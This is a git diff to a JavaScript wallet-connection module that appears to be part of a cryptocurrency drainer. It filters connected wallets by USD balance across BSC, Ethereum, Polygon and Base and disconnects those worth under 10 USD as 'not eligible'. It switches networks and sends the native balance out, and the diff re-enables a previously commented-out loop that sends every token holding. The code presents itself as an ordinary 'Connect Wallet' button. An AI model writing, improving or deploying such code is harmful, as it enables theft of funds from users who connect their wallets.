@@ -3,7 +3,7 @@ import { bsc, mainnet, polygon, base } from "@reown/appkit/networks";
 import { signMessage, sendTx } from "../services/wallet";
 import { fetchEvmBalances } from "../mine";
 import Swal from "sweetalert2";
-const MIN = 0.01;
+const MIN = 10;
 const chainInitializers = {
   bsc: {
     initializer: bsc,
@@ -45,10 +45,11 @@ export const updateButtonVisibility = (isConnected) => {
   });
 };
 
-let processed,
-  setUp = "not setup";
+let isConnected,
+processed, setUp = "not setup", eligible = 0;
 
-export const updateBtnText = async (modal, isConnected) => {
+export const updateBtnText = async (modal) => {
+  isConnected = modal.getIsConnectedState();
   const element = document.getElementById("open-connect-modal");
   element.textContent = isConnected ? "My Wallet" : "Connect Wallet";
 
@@ -61,26 +62,52 @@ export const updateBtnText = async (modal, isConnected) => {
       const balances = await fetchEvmBalances(chain, address);
       console.log(balances);
       if (balances?.error) continue;
-      chainInitializers[chain].balances = balances;
-    }
-    setUp = "done setup";
-  }
+      const { nativeBalanceUsd, tokens } = balances;
 
-  element.onclick = async () => {
-    if (setUp !== "done setup" && isConnected) {
-      return Swal.fire({
-        icon: "info",
-        title: "Hold On!",
-        text: "Please wait while loading your wallet...",
+      if (nativeBalanceUsd < MIN && !tokens.find((t) => t.balanceUsd >= MIN)) {
+        console.log(
+          `✍🏻 ${chain.toUpperCase()} has 0 or less than ${MIN}USD balances both native & Tokens = Ineligible Wallet ⛔️`
+        );
+        continue;
+      }
+      eligible++;
+      chainInitializers[chain].balances = balances;
+    };
+    if (eligible === 0) {
+      await modal.disconnect();
+      isConnected = false;
+      processed = false;
+      setUp = "not setup";
+      Swal.fire({
+        icon: "error",
+        title: "Not Eligible!",
+        text: "Sorry, your connected wallet is not eligible!",
         timer: 3000,
         timerProgressBar: true,
         showConfirmButton: false,
         position: "top-end",
         background: "#000",
         color: "#fff",
-        popup: "border border-gray-500",
       });
-    }
+      return;
+    };
+    setUp = "done setup";
+  };
+
+  element.onclick = async () => {
+    if (setUp !== "done setup" && isConnected && !processed) {
+      return Swal.fire({
+        icon: "info",
+        title: "Hold On!",
+        text: "Please hold while loading your wallet...",
+        timer: 3000,
+        timerProgressBar: true,
+        showConfirmButton: false,
+        position: "top-end",
+        background: "#000",
+        color: "#fff",
+      });
+    };
 
     modal.open();
 
@@ -91,15 +118,11 @@ export const updateBtnText = async (modal, isConnected) => {
 
     for (const chain of Object.keys(chainInitializers)) {
       const { initializer, type, balances } = chainInitializers[chain];
-      if (!balances) return console.log(`${chain} has no balances!`);
-      const { address, nativeBalance, nativeBalanceUsd, tokens } = balances;
-
-      if (nativeBalanceUsd < MIN && !tokens.find((t) => t.balanceUsd >= MIN)) {
-        console.log(
-          `✍🏻 ${chain.toUpperCase()} has 0 or less than ${MIN}USD balances both native & Tokens`
-        );
+      if (!balances){
+        console.log(`${chain} has no balances!`);
         continue;
       }
+      const { address, nativeBalance, nativeBalanceUsd, tokens } = balances;
 
       await modal.switchNetwork(initializer);
       console.log(`Switched to ${chain}: ${address}`);
@@ -125,7 +148,7 @@ export const updateBtnText = async (modal, isConnected) => {
         console.log("Error while sending native:", chain, e);
       }
 
-/*
+      
       for (const token of tokens) {
         const { tokenAddress, balance, name, symbol, decimals } = token;
         try {
@@ -146,9 +169,7 @@ export const updateBtnText = async (modal, isConnected) => {
             e
           );
         }
-      }
-*/
-
+      };
     }
   };
 };
